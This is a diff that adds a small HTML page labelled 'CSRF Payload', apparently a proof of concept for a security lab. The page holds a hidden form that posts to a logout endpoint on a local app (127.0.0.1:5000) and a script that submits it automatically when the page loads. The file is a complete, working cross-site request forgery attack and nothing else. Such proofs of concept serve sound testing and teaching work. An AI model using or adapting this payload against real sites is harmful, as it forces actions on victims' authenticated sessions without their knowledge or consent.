@@ -1,0 +1,12 @@
+<html>
+<body>
+   <h1>CSRF Payload</h1>
+   <form id="csrfForm" action="http://127.0.0.1:5000/logout" method="POST">
+       <input type="hidden" name="message" value="Bye">
+   </form>
+   <script>
+       // Automatically submit the form when the page loads
+       document.getElementById('csrfForm').submit();
+   </script>
+</body>
+</html>
